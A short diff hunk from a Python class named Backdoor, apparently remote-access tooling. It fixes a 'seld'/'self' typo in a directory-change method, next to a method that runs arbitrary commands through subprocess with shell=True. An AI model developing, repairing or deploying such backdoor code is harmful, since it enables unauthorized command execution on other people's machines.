@@ -13,7 +13,7 @@ class Backdoor:
         def execute_system_command(self,command):
                 return subprocess.check_output(command, shell = True)
 
-        def change_working_directory(seld, path):
+        def change_working_directory(self, path):
             os.chdir(path)
             return "[+] Changing working directory to " + path
 
